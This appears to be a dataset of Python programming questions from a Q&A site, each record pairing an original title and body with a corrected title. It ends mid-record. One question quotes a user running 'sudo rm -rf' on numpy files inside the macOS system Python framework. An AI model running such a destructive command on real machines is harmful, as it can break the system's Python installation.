controling the x ticks date values," I have the following data sample as x,y pairs and both x and y are Unix time-stamps: and I want to plot it as scatter, but without the ugly time stamp format shown on x and y axis.Instead, I wanted to plot dates on the axis (in format YYYY-MM-DD or any other readable format) and show them with 3 months difference.I have the following code: where getLabels(s,t) is defined as: and returns something like: Now, the problem is that the x axis ticks labels are not shown exactly as they are in the previous array of dates, instead, it shows only the first 6 dates (starting from 2012-09-30 and ending with 2013-12-31)what is the problem?  <code>  1354648326,13546483261354649456,13717755511354649664,14296498191354649667,14296440211354649683,13569761591354649767,14413697941354649863,14144673621354650486,13662973161354650757,14569626641354650789,13593981281354651552,13546564581354651555,13686314431354651591,14564204121354651616,13546516161354651715,14445732081354652048,14544433521354652382,13947225461354652687,13559938641354653448,13873786621354653731,13960943001354653769,14177650241354654110,14572305191354654111,14528547881354654179,14238778901354654266,13551485051354654374,14468482321354654374,14568640041354654615,13558589281354654700,14569458921354654707,14562651831354654744,14429391411354654747,13884366541354654771,14497998481354654775,13551777731354654808,14568578611354654809,14113697981354654855,13559343841354654915,14571004681354654962,13887842041354655085,14544464031354655219,13641965501354655232,13872148191354655262,13771708851354655264,13696896301354655289,13887503881354655389,13873873051354655434,13892551851354655436,13871659681354655592,13743691531354655661,14569127531354655811,13547182011354655889,14266755791354656139,1420486774 ax.set_xticklabels(getLabels(s,t),rotation=20) def getLabels(s,t): #s and t are unix time stamps labels =[] for x in pd.date_range(start=s, end=t, freq='3M'): labels.append(str(x).replace("" 00:00:00"","""")) print labels return labels ['2012-06-30', '2012-09-30', '2012-12-31', '2013-03-31', '2013-06-30', '2013-09-30', '2013-12-31', '2014-03-31', '2014-06-30', '2014-09-30', '2014-12-31', '2015-03-31', '2015-06-30', '2015-09-30', '2015-12-31', '2016-03-31']['2012-06-30', '2012-09-30', '2012-12-31', '2013-03-31', '2013-06-30', '2013-09-30', '2013-12-31', '2014-03-31', '2014-06-30', '2014-09-30', '2014-12-31', '2015-03-31', '2015-06-30', '2015-09-30', '2015-12-31', '2016-03-31']",controlling the x ticks date values
Action with pandas warning," I try to delete some column and convert some value in column with and to all this string I get What is problem there? <code>  df2.drop(df2.columns[[0, 1, 3]], axis=1, inplace=True)df2['date'] = df2['date'].map(lambda x: str(x)[1:])df2['date'] = df2['date'].str.replace(':', ' ', 1)df2['date'] = pd.to_datetime(df2['date']) df2.drop(df2.columns[[0, 1, 3]], axis=1, inplace=True)C:/Users/ /Desktop/projects/youtube_log/filter.py:11: SettingWithCopyWarning: A value is trying to be set on a copy of a slice from a DataFrame.Try using .loc[row_indexer,col_indexer] = value instead",Action with pandas SettingWithCopyWarning
Pandas: How to plot multiple time series into a single plot from a single dataframe?," I have the following pandas DataFrame: This is a dataframe with multiple time series-ques data, from min=1 to max=35. Each Group has a time series like this. I would like to plot each individual time series A through Z against an x-axis of 1 to 35. The y-axis would be the blocks at each time. I was thinking of using something like an Andrews Curves plot, which would plot each series against one another. Each ""hue"" would be set to a different group. (Other ideas are welcome.)My problem: how do you format this dataframe to plot multiple series? Should the columns be GroupA, GroupB, etc.? How do you get the dataframe to be in the format: Is this the correct format for an Andrews plot as shown? EDITIf I try: the x-axis is completely incorrect. All time series should be plotted from 0 to 35, all in one series. How do I solve this?  <code>  time Group blocks0 1 A 41 2 A 72 3 A 123 4 A 174 5 A 21 5 6 A 266 7 A 337 8 A 398 9 A 489 10 A 59 .... .... ....36 35 A 23137 1 B 138 2 B 1.539 3 B 340 4 B 541 5 B 6 .... .... ....911 35 Z 349 time GroupA blocksA GroupsB blocksB GroupsC blocksC.... df.groupby('Group').plot(legend=False)",Pandas: plot multiple time series DataFrame into a single plot
Exception during list comprehension. Are intermediate result kept anywhere?," When using try-except in a for loop context, the commands executed so far are obviously done with results with However the same is not true for list comprehensions And the result is Is the intermediate list, built before the exception occurred, kept anywhere? Is it accessible? <code>  a = [1, 2, 3, 'text', 5]b = []try: for k in range(len(a)): b.append(a[k] + 4)except: print('Error!')print(b) Error![5, 6, 7] c=[]try: c = [a[k] + 4 for k in range(len(a))]except: print('Error!')print(c) Error![]",Exception during list comprehension. Are intermediate results kept anywhere?
How can a portal user can modify his own partner data in Odoo 8 ?," I was trying to create a module, where portal users could modify the associated partner data. But I get a security error that only admin users could modify configs. File "".../server/openerp/addons/base/res/res_config.py"", line 541, in execute raise openerp.exceptions.AccessError(_(""Only administrators can change the settings""))I tried giving it security access like this: access_config_portal,portal_partner_config.settings,model_portal_partner_config_settings,base.group_portal,1,1,0,0But didn't work... i think it's becouse the error shows that in res_config.py execute function it's check the users to be SUPERUSER: Like this: There a way to portal users change their custom data, an associate a payment source, like a credit card? <code>  if uid != SUPERUSER_ID and not self.pool['res.users'].has_group(cr, uid, 'base.group_erp_manager'): raise openerp.exceptions.AccessError(_(""Only administrators can change the settings"")) class Configuration(models.TransientModel): _inherit = 'res.config.settings' _name = 'portal_partner_config.settings' name = fields.Char() street = fields.Char() city = fields.Char() @api.model def get_default_inova_values(self,fields): users = self.pool.get('res.users') current_user = users.browse(self._cr, self._uid, self._uid, context=self._context) name = current_user.partner_id.name street = current_user.partner_id.street city = current_user.partner_id.city return { 'name': name, 'street': street, 'city': city,} @api.one def set_inova_values(self): users = self.pool.get('res.users') current_user = users.browse(self._cr, self._uid, self._uid, context=self._context) users.sudo().write(self._cr, self._uid, current_user.id, {'name': self.name, 'street': self.street, 'city': self.city, }, context=self._context)",How can a portal user modify his own partner data in Odoo 8?
python - elegant way to reduce a list of dictionaries," I have a list of dictionaries and each dictionary contains exactly the same keys. I want to find the average value for each key and I would like to know how to do it using reduce (or if not possible with another more elegant way than using nested fors).Here is the list: I would like to get back I dictionary like this: Here is what I had so far, but I don't like it: <code>  [ { ""accuracy"": 0.78, ""f_measure"": 0.8169374016795885, ""precision"": 0.8192088044235794, ""recall"": 0.8172222222222223 }, { ""accuracy"": 0.77, ""f_measure"": 0.8159133315763016, ""precision"": 0.8174754717495807, ""recall"": 0.8161111111111111 }, { ""accuracy"": 0.82, ""f_measure"": 0.8226353934130455, ""precision"": 0.8238175920455686, ""recall"": 0.8227777777777778 }, ...] { ""accuracy"": 0.81, ""f_measure"": 0.83, ""precision"": 0.84, ""recall"": 0.83} folds = [ ... ]keys = folds[0].keys()results = dict.fromkeys(keys, 0)for fold in folds: for k in keys: results[k] += fold[k] / len(folds)print(results)",elegant way to reduce a list of dictionaries?
Minor ticks for plot using Pandas," So I am trying to get minor tick grid lines to get displayed but they don't seem to appear on the plot. An example code is What I get isThe major grid lines are displayed but the minor ones are not. I looked into the pandas documentation but just see the grid option. I was hoping to get the minor ticks grid lines to be a every 10th location on the X axis that is 460 470 etc and every location on the Y (actual scale of Y is a bit smaller) <code>  data_temp = pd.read_csv(dir_readfile, dtype=float, delimiter='\t', names = names, usecols=[0,1,2,3,4])result = data_temp.groupby(['A', 'D']).agg({'B':'mean', 'E':'mean'})result2 = result.unstack()x = np.arange(450, 700, 50, dtype = int)plt.grid(True, which='both')plt.minorticks_on()result2.B.plot(lw=2,colormap='jet',marker='.',markersize=4, title='A v/s B', legend = True, grid = 'on' , xlim = [450, 700], ylim = [-70, -0], xticks = x)",Minor ticks in pandas plot
Perl's __DATA__ equivalent in python," In Perl I often read data in from the filehandle __DATA__ at the end of the script: I find this quicker for testing code etc than reading in a file, as it means I can edit its contents on the fly. From the doc: The __DATA__ token tells the perl compiler that the perl code for compilation is finished. Everything after the __DATA__ token is available for reading via the filehandle FOOBAR::DATA, where FOOBAR is the name of the current package when the __DATA__ token is reached.Is there an equivalent in Python? If not, can anybody suggest the most Python-ish way of achieving a similar thing?  <code>  while (<DATA>) { chomp; say;}__DATA__line1line2 ",Is there are Python equivalent of Perl's __DATA__ filehandle?
Perl's __DATA__ equivalent in Python," In Perl I often read data in from the filehandle __DATA__ at the end of the script: I find this quicker for testing code etc than reading in a file, as it means I can edit its contents on the fly. From the doc: The __DATA__ token tells the perl compiler that the perl code for compilation is finished. Everything after the __DATA__ token is available for reading via the filehandle FOOBAR::DATA, where FOOBAR is the name of the current package when the __DATA__ token is reached.Is there an equivalent in Python? If not, can anybody suggest the most Python-ish way of achieving a similar thing?  <code>  while (<DATA>) { chomp; say;}__DATA__line1line2 ",Is there are Python equivalent of Perl's __DATA__ filehandle?
dynamically generating routes in FLASK," I am trying to dynamically generate routes in Flask from a list. I want to dynamically generate view functions and endpoints and add them with add_url_rule.This is what I am trying to do but I get a ""mapping overwrite"" error: <code>  routes = [ dict(route=""/"", func=""index"", page=""index""), dict(route=""/about"", func=""about"", page=""about"")]for route in routes: app.add_url_rule( route[""route""], #I believe this is the actual url route[""page""], # this is the name used for url_for (from the docs) route[""func""] ) app.view_functions[route[""func""]] = return render_template(""index.html"")",Dynamically generate Flask routes
How to center text horizontally in a kivy text input?," I want to center a single line of text in Kivy text input.I'm going to use padding but i can't find the width of the line. How can I calculate or access the width of the line? <code>  widget.padding = [ (self.textinput.width - width of line) / 2, 20, 0, 0]",How to center text horizontally in a Kivy text input?
How do I disable a test using py.test?, Let's say I have a bunch of tests: Is there a decorator or something similar that I could add to the functions to prevent pytest from running just that test? The result might look something like... <code>  def test_func_one(): ...def test_func_two(): ...def test_func_three(): ... @pytest.disable()def test_func_one(): ...def test_func_two(): ...def test_func_three(): ...,How do I disable a test using pytest?
python strftime not working with hours minutes and sections," I am reading the official documentations herehttps://docs.python.org/2/library/datetime.html#strftime-strptime-behaviorand it states that I can use %H and %M and %S for hours, minutes and secondsI do this: datetime.date.today().strftime(""%Y-%m-%d %H:%M:%S"")and I always get '2016-07-18 00:00:00'where are the values ? <code> ",python strftime not working with hours minutes and seconds
"SQLAlchemy ORM: Polymorphic Single Table Inheritance, fallback to parent"," Using Python 3.5 and SQLAlchemy 1.0.14 (ORM).I have a table of items declared as such: My Items can be of many different types, the type identifier being stored in type.For a few of those objects types, I need to have specific methods or attributes available.To achieve that I tried to use single table inheritance with several SpecialisedItem as subclass of Item: Now when I load my items, I'd want all specialised items (having type=='specialitem') to be loaded as such, while any other type value would result in the parent class Item being loaded.That doesn't work, I get AssertionError: No such polymorphic_identity 'normal' is defined when loading the items.I would like to avoid creating inherited classes that do nothing just to cover all possible type values, instead having ""unmapped"" type falling back to the parent class Item.Is there any way to achieve that effect ?Minimal test case for reference: Thanks,Guillaume <code>  from sqlalchemy.ext.declarative.api import declarative_baseBase = declarative_base()class Item(Base): __tablename__ = 'items' id = Column(Integer, primary_key=True) type = Column(String) # other non relevant attributes class Item(Base): __tablename__ = 'items' id = Column(Integer, primary_key=True) type = Column(String, index=True) # other non relevant attributes __mapper_args__ = { 'polymorphic_on': type, }class SpecialisedItem(Base): __mapper_args__ = { 'polymorphic_identity': 'specialitem', } def specialised_method(self): return ""I am special"" from sqlalchemy.engine import create_enginefrom sqlalchemy.ext.declarative.api import declarative_basefrom sqlalchemy.orm.session import sessionmakerfrom sqlalchemy.sql.schema import Columnfrom sqlalchemy.sql.sqltypes import Integer, StringBase = declarative_base()class Item(Base): __tablename__ = 'items' id = Column(Integer, primary_key=True) type = Column(String, index=True) # other non relevant attributes __mapper_args__ = { 'polymorphic_on': type, }class SpecialisedItem(Item): __mapper_args__ = { 'polymorphic_identity': 'special', } specialAttribute = Column(String) def specialised_method(self): return ""I am special""engine = create_engine(""sqlite:///:memory:"")Base.metadata.create_all(engine)Session = sessionmaker(bind=engine)session = Session()session.add(Item(type='normal'))session.add(Item(type='special'))session.commit()# loading only specialized items worksfor item in session.query(Item).filter_by(type=""special""): print(item.specialised_method())# loading other items failsfor item in session.query(Item): print(item.type)","SQLAlchemy ORM: Polymorphic Single Table Inheritance, with fallback to parent class if ""polymorphic_identity"" is not found"
Change the color of text within a pandas dataframe table python," I have a pandas dataframe: The table that prints df from this looks like this:I would like to color all of the values in the 'MOS' rows a certain color and color the left two index/header columns as well as the top header row a different background color than the rest of the cells with values in them. Any ideas how I can do this? <code>  arrays = [['Midland', 'Midland', 'Hereford', 'Hereford', 'Hobbs','Hobbs', 'Childress', 'Childress', 'Reese', 'Reese', 'San Angelo', 'San Angelo'], ['WRF','MOS','WRF','MOS','WRF','MOS','WRF','MOS','WRF','MOS','WRF','MOS']]tuples = list(zip(*arrays))index = pd.MultiIndex.from_tuples(tuples)df = pd.DataFrame(np.random.randn(12, 4), index=arrays, columns=['00 UTC', '06 UTC', '12 UTC', '18 UTC'])",Change the color of text within a pandas dataframe html table python using styles and css
Scikit-learn SVM recognition digit," I want to make a program to recognize the digit in an image. I follow the tutorial in scikit learn .I can train and fit the svm classifier like the following.First, I import the libraries and dataset Second, I create the SVM model and train it with the dataset. And then, I try to read my own image and use the function predict() to recognize the digit.Here is my image:I reshape the image into (8, 8) and then convert it to a 1D array. Finally, when I print out the prediction, it returns [1] Whatever I user others images, it still returns [1]When I print out the ""default"" dataset of number ""9"", it looks like:My image number ""9"" : You can see the non-zero number is quite large for my image.I dont know why. I am looking for help to solve my problem. Thanks <code>  from sklearn import datasets, svm, metricsdigits = datasets.load_digits()n_samples = len(digits.images)data = digits.images.reshape((n_samples, -1)) classifier = svm.SVC(gamma = 0.001)classifier.fit(data[:n_samples], digits.target[:n_samples]) img = misc.imread(""w1.jpg"")img = misc.imresize(img, (8, 8))img = img[:, :, 0] predicted = classifier.predict(img.reshape((1,img.shape[0]*img.shape[1] )))print predicted",Scikit-learn SVM digit recognition
How to swap blue and green channel in an image using OpenCV," I am facing a little bit of problem in swapping the channels (specifically red and blue) of an image. I am using Opencv 3.0.0 and Python 2.7.12. Following is my code for swapping the channels I am unable to figure out why the same image undergoing through the same(probably) operation is giving two different outputs. Can someone throw some light on what's going wrong?Original ImageManual OperationCOLOR_BGR2RGB <code>  import cv2img = cv2.imread(""input/car1.jpg"")#The obvious approachCimg = cv2.cvtColor(img, cv2.COLOR_BGR2RGB)#Manual Approachred = img[:,:,2]blue = img[:,:,0]img[:,:,0] = redimg[:,:,2] = bluecv2.imshow(""frame"",Cimg)cv2.imshow(""frame2"", img)cv2.waitKey(0)cv2.destroyAllWindows()",How to swap blue and red channel in an image using OpenCV
List notation in Python: predictions[predictions < 1e-10] = 1e-10," I am trying to find out operation applied on list. I have list/array name predictions and and executing following set of instruction. This code snippet is from a Udacity Machine Learning assignment that uses Numpy. It was used in the following manner: As pointed out by @MosesKoledoye and various others, it is actually a Numpy array. (Numpy is a Python library)What does this line do? <code>  predictions[predictions < 1e-10] = 1e-10 def logprob(predictions, labels): """"""Log-probability of the true labels in a predicted batch."""""" predictions[predictions < 1e-10] = 1e-10 return np.sum(np.multiply(labels, -np.log(predictions))) / labels.shape[0]","Python list notation, Numpy array notation: predictions[predictions < 1e-10] = 1e-10"
Encode IP address using all printable characters," I would like to encode an IP address in as short a string as possible using all the printable characters. According to https://en.wikipedia.org/wiki/ASCII#Printable_characters these are codes 20hex to 7Ehex.For example: In order to make decoding easy I also need the length of the encoding always to be the same. I also would like to avoid using the space character in order to make parsing easier in the future. How can one do this?I am looking for a solution that works in Python 2.7.x.My attempt so far to modify Eloims's answer to work in Python 2:First I installed the ipaddress backport for Python 2 (https://pypi.python.org/pypi/ipaddress) . This now fails because base64 doesn't have an attribute 'a85encode'. <code>  shorten(""172.45.1.33"") --> ""^.1 9"" maybe. #This is needed because ipaddress expects character strings and not byte strings for textual IP address representations from __future__ import unicode_literalsimport ipaddressimport base64#Taken from http://stackoverflow.com/a/20793663/2179021def to_bytes(n, length, endianess='big'): h = '%x' % n s = ('0'*(len(h) % 2) + h).zfill(length*2).decode('hex') return s if endianess == 'big' else s[::-1]def def encode(ip): ip_as_integer = int(ipaddress.IPv4Address(ip)) ip_as_bytes = to_bytes(ip_as_integer, 4, endianess=""big"") ip_base85 = base64.a85encode(ip_as_bytes) return ip_baseprint(encode(""192.168.0.1""))",Encode IP address using all printable characters in Python 2.7.x
Python: How can i create in memory database with Sqlite?," I'm trying to create an in-memory database using sqlite3 in Python.I created a function to create a db database file and store information in to it and that is working 100%.But trying to connect with :memory: I've faced some problems.What I'm doing is: create name table which returned Trueinsert some information to this table which returned Why doesn't this work? It works when I use a file: <code>  import sqlite3def execute_db(*args): db = sqlite3.connect("":memory:"") cur = db.cursor() data = True try: args = list(args) args[0] = args[0].replace(""%s"", ""?"").replace("" update "","" `update` "") args = tuple(args) cur.execute(*args) arg = args[0].split()[0].lower() if arg in [""update"", ""insert"", ""delete"", ""create""]: db.commit() except Exception as why: print why data = False db.rollback() db.commit() db.close() return data execute_db(""create table name(name text)"") execute_db(""insert into name values('Hello')"") no such table: nameFalse db = sqlite3.connect(""sqlite3.db"")",How can I create an in-memory database with sqlite?
scikit CountVectorizer - How to extract word tokens from a string containing '#' delimiter using CountVectorizer," I have list of strings. If any string contains the '#' character then I want to extract the first part of the string and get the frequency count of word tokens from this part of string only. i.eif the string is ""first question # on stackoverflow""expected tokens are ""first"",""question""If the string does not contain '#' then return tokens of the whole string.To compute the term document matrix I am using CountVectorizer from scikit.Find below my code: <code>  class MyTokenizer(object): def __call__(self,s): if(s.find('#')==-1): return s else: return s.split('#')[0] def FindKmeans(): text = [""first ques # on stackoverflow"", ""please help""] vec = CountVectorizer(tokenizer=MyTokenizer(), analyzer = 'word') pos_vector = vec.fit_transform(text).toarray() print(vec.get_feature_names())`output : [u' ', u'a', u'e', u'f', u'h', u'i', u'l', u'p', u'q', u'r', u's', u't', u'u']Expected Output : [u'first', u'ques', u'please', u'help']",Scikit Learn - Extract word tokens from a string delimiter using CountVectorizer
Why doesn't `except object` catch everything in Python?," The python language reference states in section 7.4: For an except clause with an expression, that expression is evaluated, and the clause matches the exception if the resulting object is compatible with the exception. An object is compatible with an exception if it is the class or a base class of the exception object, or a tuple containing an item compatible with the exception.So, why doesn't except object: catch everything? object is the base class of all exception classes, so except object: should be able to catch every exception. For example, this should catch the AssertionError <code>  print isinstance(AssertionError(), object) # prints Truetry: raise AssertionError()except object: # This block should execute but it never does. print 'Caught exception'",Why doesn't except object catch everything in Python?
Complex infinities - funny reslts - a numpy bug?, I've noticed funny results with complex infinities. This is nan related. But the end result is bizarre.Is it a numpy bug? Anything I should do differently? <code>  In [1]: import numpy as npIn [2]: np.isinf(1j * np.inf)Out[2]: TrueIn [3]: np.isinf(1 * 1j * np.inf)Out[3]: TrueIn [4]: np.isinf(1j * np.inf * 1)Out[4]: False,Why do NumPy operations with complex infinities lead to funny results?
predicting a new data using sklearn with Standardised the training data," I am using Sklearn to build a linear regression model (or any other model) with the following steps:X_train and Y_train are the training dataStandardize the training data fit the model Once the model is fit with scaled data, how can I predict with new data (either one or more data points at a time) using the fit model?What I am using isScale the data Predict the data I think I am missing a transformation function with preprocessing.scale so that I can save it with the trained model and then apply it on the new unseen data? any help please. <code>  X_train = preprocessing.scale(X_train) model.fit(X_train, Y_train) NewData_Scaled = preprocessing.scale(NewData) PredictedTarget = model.predict(NewData_Scaled)",Predicting new data using sklearn after standardizing the training data
tool for checking pep8 standards in code," i am developing a python library with couple of modules and files. I have read through the pep8 rules given in the below link https://www.python.org/dev/peps/pep-0008/ Is there any package or software available which can check the python styles and structure . for example , indendation with spaces or tabs , variable conventions etc.I am looking for a module which can perform this task..  <code> ",How to check pep8 standards in my code
Python itertools with multiprocessing - huge table vs inefficient CPUs usage with iterator," I work on n elements (named ""pair"" below) variations with repetition used as my function's argument. Obviously everything works fine as long as the ""r"" list is not big enough to consume all the memory. The issue is I have to make more then 16 repetitions for 6 elements eventually. I use 40 cores system in cloud for this. The code looks looks like the following: I believe i should use iterator instead of creating the huge list upfront and here the problem starts..I tried to solve the issue with the following code: The memory problem goes away but the CPUs usage is like 5% per core. Now the single core version of the code is faster then this.I'd really appreciate if you could guide me a bit..Thanks. <code>  if __name__ == '__main__': pool = Pool(39) r = itertools.product(pairs,repeat=16) pool.map(f, r) if __name__ == '__main__': pool = Pool(39) for r in itertools.product(pairs,repeat=14): pool.map(f, r)",Python itertools with multiprocessing - huge list vs inefficient CPUs usage with iterator
Apply function on each column in dataframe," How I can write following function in more pandas way: Thanks for help. <code>  def calculate_df_columns_mean(self, df): means = {} for column in df.columns.columns.tolist(): cleaned_data = self.remove_outliers(df[column].tolist()) means[column] = np.mean(cleaned_data) return means",Apply function on each column in a pandas dataframe
filename.whl is not a supported wheel on this platform," I saw the same question, but it didn't work for me. I also have the same problem for NumPy: Then I get:numpy-1.11.1+mkl-cp34-cp34m-win_amd64.whl is not a supported wheel onthis platform. Storing debug log for failure inC://Users/myUsername/pip/pip.logI'm using 64-bit and Python 3.4.0. What is wrong? <code>  pip install PyOpenGL.3.1.1-cp34-cp34m-win_amd64.whl pip install numpy-1.11.1+mkl-cp34-cp34m-win_amd64.whl","""filename.whl is not a supported wheel on this platform"""
Can I predefine a slice for a 2d array?," I've tried to find a neat solution to this, but I'm slicing several 2D arrays of the same shape in the same manner. I've tidied it up as much as I can by defining a list containing the 'x,y' center e.g. cpix = [161, 134] What I'd like to do is instead of having to write out the slice three times like so: is just have something predefined (like maybe a mask?) so I can just do a Is this something that numpy supports?  <code>  a1 = array1[cpix[1]-50:cpix[1]+50, cpix[0]-50:cpix[0]+50] a2 = array2[cpix[1]-50:cpix[1]+50, cpix[0]-50:cpix[0]+50] a3 = array3[cpix[1]-50:cpix[1]+50, cpix[0]-50:cpix[0]+50] a1 = array1[predefined_2dslice] a2 = array2[predefined_2dslice] a3 = array3[predefined_2dslice] ",How can I create a slice object for Numpy array?
How to find and leave only only doubles in list python?," How to find only doubles in list? My version of the algorithm need find result such as ccode defects:three list (a,b,c), one collections (dict)long codeme need leave list doubles values, example. x = [1,2,2,2,3,4,5,6,6,7], need [2,2,2,6,6] not [2,6] <code>  import collectionsa = [1,2,3,4,5,2,4,5]b = []for x,y in collections.Counter(a).items(): if y>1: b.append(x)print(b) # [2, 4, 5]c = []for item in a: if item in b: c.append(item)print(c) # [2, 4, 5, 2, 4, 5]",How to find and leave only doubles in list python?
sklearn pipeline - Transformation on only certain features, I am pretty new to pipelines in sklearn and I am running into this problem: I have a dataset that has a mixture of text and numbers i.e. certain columns have text only and rest have integers (or floating point numbers). I was wondering if it was possible to build a pipeline where I can for example call LabelEncoder() on the text features and MinMaxScaler() on the numbers columns. The examples I have seen on the web mostly point towards using LabelEncoder() on the entire dataset and not on select columns. Is this possible? If so any pointers would be greatly appreciated. <code> ,sklearn pipeline - how to apply different transformations on different columns
sklearn pipeline - how to apply different transformations on different coluns, I am pretty new to pipelines in sklearn and I am running into this problem: I have a dataset that has a mixture of text and numbers i.e. certain columns have text only and rest have integers (or floating point numbers). I was wondering if it was possible to build a pipeline where I can for example call LabelEncoder() on the text features and MinMaxScaler() on the numbers columns. The examples I have seen on the web mostly point towards using LabelEncoder() on the entire dataset and not on select columns. Is this possible? If so any pointers would be greatly appreciated. <code> ,sklearn pipeline - how to apply different transformations on different columns
Most efficient way to turn dictionary into symmetric/distance matrix (Python | Pandas)," I'm doing pairwise distance for something with a weird distance metric. I have a dictionary like {(key_A, key_B):distance_value} and I want to make a symmetric pd.DataFrame like a distance matrix. What is the most efficient way to do this? I found one way but it doesn't seem like the best way to do this. Is there anything in NumPy or Pandas that does this type of operation? or just a quicker way? My way is 1.46 ms per loop  <code>  np.random.seed(0)D_pair_value = dict()for pair in itertools.combinations(list(""ABCD""),2): D_pair_value[pair] = np.random.randint(0,5)D_pair_value# {('A', 'B'): 4,# ('A', 'C'): 0,# ('A', 'D'): 3,# ('B', 'C'): 3,# ('B', 'D'): 3,# ('C', 'D'): 1}D_nested_dict = defaultdict(dict)for (p,q), value in D_pair_value.items(): D_nested_dict[p][q] = value D_nested_dict[q][p] = value# Fill diagonal with zerosDF = pd.DataFrame(D_nested_dict)np.fill_diagonal(DF.values, 0)DF",Most efficient way to turn dictionary into symmetric/distance matrix in Pandas
Underscore after a variable in python, I am deciphering someone else's code and I see the following: Does the underscore AFTER the variable mean anything or is this just a part of the variable's name and means nothing? <code>  def get_set_string(set_): if PY3: return str(set_) else: return str(set_),Underscore after a variable name in Python
Underscore after a variable name in python, I am deciphering someone else's code and I see the following: Does the underscore AFTER the variable mean anything or is this just a part of the variable's name and means nothing? <code>  def get_set_string(set_): if PY3: return str(set_) else: return str(set_),Underscore after a variable name in Python
Python import behavior," I am seeing Python behavior that I don't understand. Consider this layout: main.py: test1.py: test2.py: config.py: so, python main.py produce: I am confused by the last line. I thought that it would print initial_value again because I'm importing config.py in test2.py again, and I thought that changes that I've made in the previous step would be overwritten. Am I misunderstanding something? <code>  project| main.py| test1.py| test2.py| config.py import config as confimport test1import test2print(conf.test_var)test1.test1()print(conf.test_var)test2.test2() import config as confdef test1(): conf.test_var = 'test1' import config as confdef test2(): print(conf.test_var) test_var = 'initial_value' initial_valuetest1test1",Imported a Python module; why does a reassigning a member in it also affect an import elsewhere?
Python attribute lookup rule," Why does D.__class__ return the name of the class, while D().__class__ returns the defined attribute in class D? And from where do builtin attributes such as __class__ and __name__ come from? I suspected __name__ or __class__ to be simple descriptors that live either in object class or somewhere, but this can't be seen.In my understanding, the attribute lookup rule as follows in Python, omitting the conditions for descriptors etc..: Instance --> Class --> Class.__bases__ and the bases of the other classes as wellGiven the fact that a class is an instance of a metaclass, type in this case, why D.__class__ doesn't look for __class__ in D.__dict__? <code>  >>> class D:... __class__ = 1... __name__ = 2...>>> D.__class__<class 'type'>>>> D().__class__1>>> D.__name__'D'>>> D().__name__2",class attribute lookup rule?
Django Charfield null=False Inegrity Error not raised," I have a model: In my shell when I try and save a Discount object with no input, it doesn't raise an error. What am I doing wrong? <code>  class Discount(models.Model): code = models.CharField(max_length=14, unique=True, null=False, blank=False) email = models.EmailField(unique=True) discount = models.IntegerField(default=10) > e = Discount()> e.save()",Django Charfield null=False Integrity Error not raised
How to correctly uninstall numpyon MacOSX?," I'm on a Mac, and I installed numpy and sklearn in that order. Now, I'm faced with these errors that have already been mentioned on SO several times: sklearn ""numpy.dtype has the wrong size, try recompiling"" in both pycharm and terminalValueError: numpy.dtype has the wrong size, try recompilingImportError in importing from sklearn: cannot import name check_buildSo, I try to remediate this error by uninstalling numpy, and reinstalling a previous version. 1) sudo pip install --upgrade numpy..gives permission error...OSError: [Errno 1] Operation not permitted: '/tmp/pip-OVY0Vq-uninstall/System/Library/Frameworks/Python.framework/Versions/2.7/Extras/lib/python/numpy-1.8.0rc1-py2.7.egg-info'...2) I tried brew uninstall numpy, but import numpy still works even after a shell restart.The only thing left I can think of is to manually delete all of the numpy files, which, on a Mac seeem to be found under sudo rm -rf /System/Library/Frameworks/Python.framework/Versions/2.7/Extras/lib/python/numpy....but even that gives me a permission error. what gives?  <code> ",How to correctly uninstall numpy on MacOSX?
Decode Base64 string to byte," I would create a python script that decode a Base64 string to an array of byte (or array of Hex values).The embedded side of my project is a micro controller that creates a base64 string starting from raw byte. The string contains some no-printable characters (for this reason I choose base64 encoding).On the Pc side I need to decode the the base64 string and recover the original raw bytes.My script uses python 2.7 and the base64 library: The resulting string is a characters string that contains some not printable char.Is there a way to decode base64 string to byte (or hex) values?Thanks in advance! <code>  base64Packet = raw_input('Base64 stream:')packet = base64.b64decode(base64Packet )sys.stdout.write(""Decoded packet: %s""%packet)",Decode Base64 string to byte array
What is map_partitions doing?," The dask API says, that map_partition can be used to ""apply a Python function on each DataFrame partition."" From this description and according to the usual behaviour of ""map"", I would expect the return value of map_partitions to be (something like) a list whose length equals the number of partitions. Each element of the list should be one of the return values of the function calls.However, with respect to the following code, I am not sure, what the return value depends on: VAL = pd.Series({'A': 1}) causes 4 function calls (probably one to infer the dtype and 3 for the partitions) and an output with len == 3 and the type pd.Series.pd.DataFrame({'A': [1]}) results in the same numbers, however the resulting type is pd.DataFrame.VAL = None causes an TypeError ... why? Couldn't a possible use of map_partitions be to do something rather than to return something?VAL = 1 results in only 2 function calls. The result of map_partitions is the integer 1.Therefore, I want to ask some questions:how is the return value of map_partitions determined? What influences the number of function calls besides the number of partitions / What criteria has a function to fulfil to be called once with each partition? What should be the return value of a function, that only ""does"" something, i.e. a procedure? How should a function be designed, that returns arbitrary objects? <code>  #generate example dataframepdf = pd.DataFrame(np.random.randint(0,100,size=(100, 4)), columns=list('ABCD'))ddf = dd.from_pandas(pdf, npartitions=3)#define helper function for map. VAL is the return valueVAL = pd.Series({'A': 1})#VAL = pd.DataFrame({'A': [1]}) #other return values used in this example#VAL = None#VAL = 1def helper(x): print('function called\n') return VAL#check resultout = ddf.map_partitions(helper).compute()print(len(out))",What is the return value of map_partitions?
list all stacks using boto3, We need to list all the stacks that are in CREATE_COMPLETE state. In our AWS account we have >400 such stacks. We have the following code written for this: However this lists only the first 100 stacks. We want to know how we can get all the stacks? We are using the python boto3 library. <code>  stack_session = session.client('cloudformation')list_stacks = stack_session.list_stacks(StackStatusFilter=['CREATE_COMPLETE']),Listing more than 100 stacks using boto3
How to import function from module in same folder python3.5?," I am trying to separate my script into several files with functions, so I moved some functions into separate files and want to import them into one main file. The structure is: posts_run.py has two functions, get_all_posts and retrieve_posts, so I try import get_all_posts with: Python 3.5 gives the error: Main.py contains following rows of code: Then i need to import api to functions, so I have ability to get API calls to vk.Full stack trace api - is a api = vk.API(session) in main.py.absolute_url and fullname are also stored in main.py.I am using PyCharm 2016.1 on Windows 7, Python 3.5 x64 in virtualenv.How can I import this function? <code>  core/ main.py posts_run.py from posts_run import get_all_posts ImportError: cannot import name 'get_all_posts' import vkfrom configs import client_id, login, passwordsession = vk.AuthSession(scope='wall,friends,photos,status,groups,offline,messages', app_id=client_id, user_login=login, user_password=password)api = vk.API(session) Traceback (most recent call last): File ""E:/gited/vkscrap/core/main.py"", line 26, in <module> from posts_run import get_all_posts File ""E:\gited\vkscrap\core\posts_run.py"", line 7, in <module> from main import api, absolute_url, fullname File ""E:\gited\vkscrap\core\main.py"", line 26, in <module> from posts_run import get_all_postsImportError: 